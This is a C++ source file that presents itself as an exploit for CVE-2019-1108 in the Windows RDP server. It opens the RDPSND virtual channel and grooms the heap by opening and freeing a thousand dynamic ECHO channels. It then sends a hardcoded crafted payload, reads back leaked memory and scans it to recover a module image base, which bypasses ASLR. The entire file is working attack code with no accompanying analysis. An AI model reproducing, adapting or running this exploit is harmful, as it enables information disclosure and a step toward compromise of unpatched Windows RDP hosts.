#include <iostream>
#include <Windows.h>
#include <utility>
#include <limits.h>
#include <iomanip>
#include <Shlwapi.h>
#include <WtsApi32.h>

#pragma comment( lib, "Wtsapi32.lib" )

#define MAX_HANDLE_NUM 1000
#define MAX_BUFFER_LEN 5000
#define NUM_TABLE_ELEMENTS 4
#define PAYLOAD_LEN 0x3ca

DWORD cur_num_handle = 0;
HANDLE dynvcs_arr[MAX_HANDLE_NUM];

DWORD offset_table[NUM_TABLE_ELEMENTS] = { 0x3c8, 0xd00, 0xff0, 0xb40 };
DWORD offset_table_[NUM_TABLE_ELEMENTS] = { 0x183c8, 0x59d00, 0x4fff0, 0x4bb40 };
char payload[] = 
"\x07\xbb\xc6\x03\xa8\x0e\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x10\x00\xff\x00\x00\x00\x01\x00\x02\x00\x44\xac\x00\x00"
"\x00\x00\x00\x00\x04\x00\x10\x00\x00\x00\x06\x00\x02\x00\x00\x00"
"\x00\x00\x88\x58\x01\x00\x02\x00\x08\x00\x00\x00\x07\x00\x02\x00"
"\x44\xac\x00\x00\x00\x00\x01\x00\x02\x00\x08\x00\x00\x00\x02\x00"
"\x02\x00\x44\xac\x00\x00\x00\x00\x00\x00\x00\x08\x04\x00\x20\x00"
"\xf4\x07\x07\x00\x00\x01\x00\x00\x00\x02\x00\xff\x00\x00\x00\x00"
"\xc0\x00\x40\x00\xf0\x00\x00\x00\xcc\x01\x30\xff\x88\x01\x18\xff"
"\x11\x00\x02\x00\x44\xac\x00\x00\x00\x00\x00\x00\x00\x08\x04\x00"
"\x02\x00\xf9\x07\x06\x00\x02\x00\x22\x56\x00\x00\x00\x00\x00\x00"
"\x02\x00\x08\x00\x00\x00\x06\x00\x01\x00\x44\xac\x00\x00\x00\x00"
"\x00\x00\x01\x00\x08\x00\x00\x00\x07\x00\x02\x00\x22\x56\x00\x00"
"\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x07\x00\x01\x00\x44\xac"
"\x00\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x02\x00\x02\x00"
"\x22\x56\x00\x00\x00\x00\x00\x00\x00\x04\x04\x00\x20\x00\xf4\x03"
"\x07\x00\x00\x01\x00\x00\x00\x02\x00\xff\x00\x00\x00\x00\xc0\x00"
"\x40\x00\xf0\x00\x00\x00\xcc\x01\x30\xff\x88\x01\x18\xff\x11\x00"
"\x02\x00\x22\x56\x00\x00\x00\x00\x00\x00\x00\x04\x04\x00\x02\x00"
"\xf9\x03\x02\x00\x01\x00\x44\xac\x00\x00\x00\x00\x00\x00\x00\x04"
"\x04\x00\x20\x00\xf4\x07\x07\x00\x00\x01\x00\x00\x00\x02\x00\xff"
"\x00\x00\x00\x00\xc0\x00\x40\x00\xf0\x00\x00\x00\xcc\x01\x30\xff"
"\x88\x01\x18\xff\x11\x00\x01\x00\x44\xac\x00\x00\x00\x00\x00\x00"
"\x00\x04\x04\x00\x02\x00\xf9\x07\x06\x00\x02\x00\x11\x2b\x00\x00"
"\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x06\x00\x01\x00\x22\x56"
"\x00\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x07\x00\x02\x00"
"\x11\x2b\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x07\x00"
"\x01\x00\x22\x56\x00\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00"
"\x06\x00\x02\x00\x40\x1f\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00"
"\x00\x00\x07\x00\x02\x00\x40\x1f\x00\x00\x00\x00\x00\x00\x02\x00"
"\x08\x00\x00\x00\x02\x00\x02\x00\x11\x2b\x00\x00\x00\x00\x00\x00"
"\x00\x02\x04\x00\x20\x00\xf4\x01\x07\x00\x00\x01\x00\x00\x00\x02"
"\x00\xff\x00\x00\x00\x00\xc0\x00\x40\x00\xf0\x00\x00\x00\xcc\x01"
"\x30\xff\x88\x01\x18\xff\x11\x00\x02\x00\x11\x2b\x00\x00\x00\x00"
"\x00\x00\x00\x02\x04\x00\x02\x00\xf9\x01\x02\x00\x01\x00\x22\x56"
"\x00\x00\x00\x00\x00\x00\x00\x02\x04\x00\x20\x00\xf4\x03\x07\x00"
"\x00\x01\x00\x00\x00\x02\x00\xff\x00\x00\x00\x00\xc0\x00\x40\x00"
"\xf0\x00\x00\x00\xcc\x01\x30\xff\x88\x01\x18\xff\x11\x00\x01\x00"
"\x22\x56\x00\x00\x00\x00\x00\x00\x00\x02\x04\x00\x02\x00\xf9\x03"
"\x06\x00\x01\x00\x11\x2b\x00\x00\x00\x00\x00\x00\x01\x00\x08\x00"
"\x00\x00\x07\x00\x01\x00\x11\x2b\x00\x00\x00\x00\x00\x00\x01\x00"
"\x08\x00\x00\x00\x31\x00\x01\x00\x44\xac\x00\x00\x00\x00\x00\x00"
"\x41\x00\x00\x00\x02\x00\x40\x01\x02\x00\x02\x00\x40\x1f\x00\x00"
"\x00\x00\x00\x00\x00\x02\x04\x00\x20\x00\xf4\x01\x07\x00\x00\x01"
"\x00\x00\x00\x02\x00\xff\x00\x00\x00\x00\xc0\x00\x40\x00\xf0\x00"
"\x00\x00\xcc\x01\x30\xff\x88\x01\x18\xff\x11\x00\x02\x00\x40\x1f"
"\x00\x00\x00\x00\x00\x00\x00\x02\x04\x00\x02\x00\xf9\x01\x06\x00"
"\x01\x00\x40\x1f\x00\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00"
"\x07\x00\x01\x00\x40\x1f\x00\x00\x00\x00\x00\x00\x01\x00\x08\x00"
"\x00\x00\x02\x00\x01\x00\x11\x2b\x00\x00\x00\x00\x00\x00\x00\x01"
"\x04\x00\x20\x00\xf4\x01\x07\x00\x00\x01\x00\x00\x00\x02\x00\xff"
"\x00\x00\x00\x00\xc0\x00\x40\x00\xf0\x00\x00\x00\xcc\x01\x30\xff"
"\x88\x01\x18\xff\x11\x00\x01\x00\x11\x2b\x00\x00\x00\x00\x00\x00"
"\x00\x01\x04\x00\x02\x00\xf9\x01\x31\x00\x01\x00\x22\x56\x00\x00"
"\x00\x00\x00\x00\x41\x00\x00\x00\x02\x00\x40\x01\x02\x00\x01\x00"
"\x40\x1f\x00\x00\x00\x00\x00\x00\x00\x01\x04\x00\x20\x00\xf4\x01"
"\x07\x00\x00\x01\x00\x00\x00\x02\x00\xff\x00\x00\x00\x00\xc0\x00"
"\x40\x00\xf0\x00\x00\x00\xcc\x01\x30\xff\x88\x01\x18\xff\x11\x00"
"\x01\x00\x40\x1f\x00\x00\x00\x00\x00\x00\x00\x01\x04\x00\x02\x00"
"\xf9\x01\x31\x00\x01\x00\x11\x2b\x00\x00\x00\x00\x00\x00\x41\x00"
"\x00\x00\x02\x00\x40\x01\x31\x00\x01\x00\x40\x1f\x00\x00\x00\x00"
"\x00\x00\x41\x00\x00\x00\x02\x00\x40\x01";

void DumpHex(CHAR *arr, DWORD len) {
	for (int i = 0; i < len; i++) {
		if (i % 16 == 0) {
			std::cout << std::endl;
		}
		printf("%02x ", arr[i] & 0xff);
	}

	std::cout << std::endl;
}

void OpenDynvcChannel(HANDLE rdpserver) {
	HANDLE dynvc_handle = WTSVirtualChannelOpenEx(WTS_CURRENT_SESSION,
		(LPSTR)"ECHO",
		WTS_CHANNEL_OPTION_DYNAMIC | WTS_CHANNEL_OPTION_DYNAMIC_PRI_LOW);

	if (dynvc_handle == NULL) {
		std::cerr << "WTSVirtualChannelOpenEx() failed: " << GetLastError() << std::endl;
		exit(-1);
	}

	dynvcs_arr[cur_num_handle++] = dynvc_handle;

	return;
}

void SendDataFirstPDU(DWORD channel_id, DWORD size, CHAR spray) {
	CHAR buffer[0x1500] = { 0, };
	ULONG bytes_written;

	buffer[0] = 0x20 | 0xa;
	*(uint32_t*)(buffer + 1) = channel_id;
	*(uint32_t*)(buffer + 5) = size;
	memset(buffer + 9, spray, size);

	if (!WTSVirtualChannelWrite(
		dynvcs_arr[channel_id],
		buffer,
		size + 0x9,
		&bytes_written)) {
		std::cout << "WTSVirtualChannelWrite() failed" << std::endl;
		exit(-1);
	}

	return;
}

void FreeDynvcChannel(DWORD channel_id) {
	CHAR buffer[0x1500] = { 0, };
	ULONG bytes_written;

	buffer[0] = 0x40 | 0x2;
	*(uint32_t*)(buffer + 1) = channel_id;

	if (!WTSVirtualChannelWrite(
		dynvcs_arr[channel_id],
		buffer,
		5,
		&bytes_written)) {
		std::cout << "WTSVirtualChannelWrite() failed" << std::endl;
		exit(-1);
	}

	if (dynvcs_arr[channel_id]) {
		CloseHandle(dynvcs_arr[channel_id]);
		dynvcs_arr[channel_id] = NULL;
		cur_num_handle--;
	}

	return;
}

PVOID ScanImageBase(PCHAR leaked, ULONG bytes_leaked) {
	CHAR signature[2] = { 0xfe, 0x07 };
	DWORD tmp_offset;
	PVOID image_base = NULL;
	DWORD64 tmp;

	for (int i = 0; i < bytes_leaked; i++) {
		if (leaked[i] == signature[0] && leaked[i + 1] == signature[1]) {
			tmp = *(PDWORD64)(&leaked[i] - 0x4);

			for (int j = 0; j < NUM_TABLE_ELEMENTS; j++) {
				if ((tmp & 0xfff) - offset_table[j] <= 0x30) {
					tmp -= offset_table_[j] - ((tmp & 0xfff) - offset_table[j]);
					image_base = (PVOID)tmp;
					return image_base;
				}
			}			
		}
	}

	return image_base;
}

int main(int argc, char **argv) {
	HANDLE rdpServer = WTSOpenServerA((LPSTR)"localhost");
	HANDLE vChannel = WTSVirtualChannelOpen(
		rdpServer,
		WTS_CURRENT_SESSION,
		(LPSTR)"RDPSND");

	if (vChannel == NULL) {
		std::cerr << "WTSVirtualChannelOpen() failed" << std::endl;
		exit(-1);
	}

	ULONG bytes_written;
	ULONG bytes_leaked;
	BOOL is_success;
	DWORD tries = 0;
	CHAR leaked[MAX_BUFFER_LEN];
	PVOID image_base = NULL;

	std::cout << "[*] CVE-2019-1108 Exploit" << std::endl;
	std::cout << "[*] Triggering vuln.." << std::endl;
	while (TRUE) {
		for (int i = 0; i < MAX_HANDLE_NUM; i++) {
			OpenDynvcChannel(rdpServer);
		}

		for (int i = 0; i < MAX_HANDLE_NUM; i++) {
			FreeDynvcChannel(i);
		}

		if (!WTSVirtualChannelWrite(
			vChannel,
			payload,
			PAYLOAD_LEN,
			&bytes_written)) {
			std::cout << "WTSVirtualChannelWrite() failed" << std::endl;
			exit(-1);
		}

		if (!WTSVirtualChannelRead(
			vChannel,
			INFINITE,
			leaked,
			sizeof(leaked),
			&bytes_leaked)) {
			std::cout << "WTSVirtualChannelRead() failed" << std::endl;
			exit(-1);
		}

		if (image_base = ScanImageBase(leaked, bytes_leaked)) {
			std::cout << "[*] Image base leaked @ 0x" << std::hex << (DWORD64)image_base << std::endl;
			DumpHex(leaked, bytes_leaked);
			break;
		}
	}

	WTSVirtualChannelClose(vChannel);
	WTSCloseServer(rdpServer);
	CloseHandle(vChannel);
	CloseHandle(rdpServer);

	return 0;
}